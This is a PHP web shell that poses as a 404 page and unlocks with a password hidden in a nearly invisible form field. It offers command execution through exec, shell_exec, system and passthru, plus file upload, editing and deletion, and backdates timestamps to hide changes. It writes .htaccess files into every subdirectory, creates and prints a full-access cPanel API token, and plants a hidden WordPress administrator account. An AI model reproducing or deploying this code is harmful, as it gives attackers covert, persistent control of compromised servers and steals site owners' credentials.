<?php
session_start();
$authbento = '2618f265352b394623feeadb543c20b7';
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['auth'])) {
    $op = $_POST['auth'];

    if (md5($op) == $authbento) {
        $op2 = md5($op);
        setcookie('authenticated', $op2, time() + 3600000); // 1 hour expiry
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $error = "Nop!!";
    }
}
$authenticated = isset($_COOKIE['authenticated']) && $_COOKIE['authenticated'] === $authbento;
if (!$authenticated) {
    ?>
    <?php
        header("HTTP/1.0 404 Not Found");
        echo '<h1>404 Not Found</h1>';
        echo 'The page you are looking for could not be found.'; 
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    </head>
    <body>
        <?php if (isset($error)) { echo '<p style="color:red;">' . $error . '</p>'; } ?>
        <form method="post" action="">
            <input type="password" id="auth" name="auth" required style="margin:0;background-color:#fff;border:1px solid #fff;">
        </form>
    </body>
    </html>
    <?php
    exit();

}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elep</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
        <script type="text/javascript">
        function confirmSubmission() {
            return confirm('Are you sure you want to do this?');
        }
    </script>
</head>

<body>

    <?php


    //function
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }
    function getAllSubdirectories($dir) {
        $subdirectories = [];
        $items = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir), RecursiveIteratorIterator::SELF_FIRST);
    
        foreach ($items as $item) {
            if ($item->isDir() && $item->getRealPath() !== realpath($dir)) {
                $subdirectories[] = $item->getRealPath();
            }
        }
    
        return $subdirectories;
    }
    function saveTextToFileInSubdirectories($textContent, $targetDirectory, $fileName, $scriptDirectory) {
        $subdirectories = getAllSubdirectories($targetDirectory);
    
        foreach ($subdirectories as $subdir) {
            $filePath = $subdir . DIRECTORY_SEPARATOR . $fileName;
    
            // Check if the target directory is within the allowed path
            if (strpos(realpath($filePath), realpath($targetDirectory)) === 0 &&
                strpos(realpath($subdir), realpath($scriptDirectory)) === 0) {
                if (file_put_contents($filePath, $textContent) === false) {
                    echo "Failed to write to {$filePath}<br>";
                } else {
                    echo "Written to {$filePath}<br>";
                }
            } else {
                echo "Attempt to write outside the allowed directory: {$filePath}<br>";
            }
        }
    }
    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }
    function ben10($nonce_ffp) {
        $response = [];
    
        $output = [];
        $return_var = 0;
        exec($nonce_ffp, $output, $return_var);
        if ($return_var === 0) {
            $response['method'] = 'exec';
            $response['output'] = implode("\n", $output);
            return $response;
        }
    
        $output = shell_exec($nonce_ffp);
        if ($output !== null) {
            $response['method'] = 'shell_exec';
            $response['output'] = $output;
            return $response;
        }
    
        ob_start();
        $return_var = 0;
        system($nonce_ffp, $return_var);
        $output = ob_get_clean();
        if ($return_var === 0) {
            $response['method'] = 'system';
            $response['output'] = $output;
            return $response;
        }
    
        ob_start();
        passthru($nonce_ffp, $return_var);
        $output = ob_get_clean();
        if ($return_var === 0) {
            $response['method'] = 'passthru';
            $response['output'] = $output;
            return $response;
        }
    
        return $response;
    }
    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($a, $b, $path);
    }
    function decodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($b, $a, $path);
    }



    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    echo ('
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  <div class="navbar-brand">
  <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "ঘ", $paths[$i]);
            if ($i != $id)
                echo "ক";
        }
        echo "'>" . $dir_part . "</a>/";
    }
    echo ('
</div>
<div class="form-inline">
<a href="?upxc&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-info" type="button">Upload File</button></a>
<a href="?addmename&q=' . urlencode(encodePath(PATH)) . '"><button type="button" class="btn btn-warning">WP user</button></a>
<a href="?api3"><button type="button" class="btn btn-info">API</button></a>
<a href="?htall"><button type="button" class="btn btn-danger">HT-access</button></a>
<a href="?"><button type="button" class="btn btn-primary">HOME</button></a>
</div>
</nav>');


    if (isset($_GET['p'])) {

        //fetch files
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            if($folder == '.'){
                echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='mkdir' href='?q=" . urlencode(encodePath(PATH)) . "&cre=" . $folder . "'><i class='fa-solid fa-folder-plus'></i></a>
      <td>
    </tr>
";}
else{
            echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a onclick='return confirmSubmission()' title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";}
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</a></td>
          <td>
          <a title='Touch' href='?q=" . urlencode(encodePath(PATH)) . "&t=" . $file . "'><i class='fa-solid fa-fingerprint'></i></a>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a onclick='return confirmSubmission()' title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";
        }
        echo "  </tbody>
</table>";
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }
    if (isset($_GET['htall'])){
        echo '
    <center><form method="post" action="?htall" id="htmax" onsubmit="return confirmSubmission()">
    <h4>!!</h4>
    <div class="input-group">
  <div class="input-group-prepend">
  </div>
  <textarea  name="ff" id="taid" class="form-control" ></textarea>
</div>
    <br>
        <input type="submit" class="btn btn-dark" value="submit" name="OK im Sure">
    </form>';
        $targetDirectory = dirname(__FILE__);
        echo '<div class="alert alert-danger" role="alert">This Directory  alert—check it out! And Test ht@ac First  ::   '.$targetDirectory.' :: This Script Will Not put htac in home directory do it man when its save </div>';
        if (isset($_POST['ff'])) {
            $textContent = $_POST['ff'];
            $fileName = '.htaccess';
            $maybedone = saveTextToFileInSubdirectories($textContent, $targetDirectory, $fileName,$targetDirectory);
        if($maybedone ){
            echo "<script>alert('Done.');</script>";
        }
    }}
    if (isset($_GET['upxc'])) {
        echo '
    <form method="post" enctype="multipart/form-data">
        Select file to upload:
        <input type="file" name="bnexazabi" id="bnexazabi">
        <input type="submit" class="btn btn-dark" value="upofile" name="upofile">
    </form>';
    }
    if (isset($_GET['api3'])) {
        $site = $_SERVER['HTTP_HOST'];
        $nonce_api = ben10("uapi Tokens create_full_access name=IT-S");
        if(preg_match_all("/token:(.*)/", $nonce_api['output'],$matches)){
            if($matches[1] != null){
                $tokenz = $site.":".get_current_user().":".$matches[1][0];
                echo $tokenz;
            }}
        $x2 = preg_match_all("/conflicting API token with the name/",$nonce_api['output']);
        if($x2){
            echo "Already Exist";
        }
        else(
            print("NO-CP or Fun-disabled")
        );
    }
    if (isset($_GET['addmename'])) {
        if(file_exists(PATH.'/wp-load.php')){
            include PATH."/wp-load.php";
            $ufuc = "it-team-".rand(0,9);
            $ufup = "K4MP4NG".rand(1000,9999)."$$";
            update_option("default_role","administrator");
            wp_create_user($ufuc,$ufup);
            update_option("default_role","subscriber");
			$site = get_option('siteurl');
            if ( get_user_by('login',$ufuc) != false ) {
                echo "User OK ==>  $site|$ufuc|$ufup save !!";
            } else {
                echo "Can't create user check man";
            }
        }
        else{
            echo "wp-load.php not found not wp or wrong dir ";
        }
        
    }

    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }
    if (isset($_GET['cre'])) {
        if (!empty($_GET['cre']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Create F:
        <input type="text" name="name" value="">
        <input type="submit" class="btn btn-dark" value="dirc" name="dirc">
    </form>';
            if (isset($_POST['dirc'])) {
                $name = PATH . "/" . $_POST['name'];
                if(mkdir($name, 0755)) {
                    echo ("<script>alert('Created.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }
    if (isset($_GET['t'])) {
        if (!empty($_GET['t']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Touch:
        <input type="text" name="name" value="' . $_GET['t'] . '">
        <input type="submit" class="btn btn-dark" value="touch" name="touch">
    </form>';
            if (isset($_POST['touch'])) {
                $name = PATH . "/" . $_GET['t'];
                $current_time = time();
                $na9is = strtotime('-1 year', $current_time);
                if(Touch($name, $na9is)) {
                    echo ("<script>alert('Touched.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';

    if(isset($_POST['edit'])) {
        $filename = PATH."/".$_GET['e'];
        $data = $_POST['data'];
        $open = fopen($filename,"w");
        if(fwrite($open,$data)) {
            echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
        fclose($open);
    }
        }
    }

    if (isset($_POST["upofile"])) {
        $target_file = PATH . "/" . $_FILES["bnexazabi"]["name"];
        if (move_uploaded_file($_FILES["bnexazabi"]["tmp_name"], $target_file)) {
            echo "<p>".htmlspecialchars(basename($_FILES["bnexazabi"]["name"])) . " has been uploaded.</p>";
        } else {
            echo "<p>Sorry, there was an error uploading your file.</p>";
        }

    }
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(rmdir($name) == true) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
    ?>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>

</html>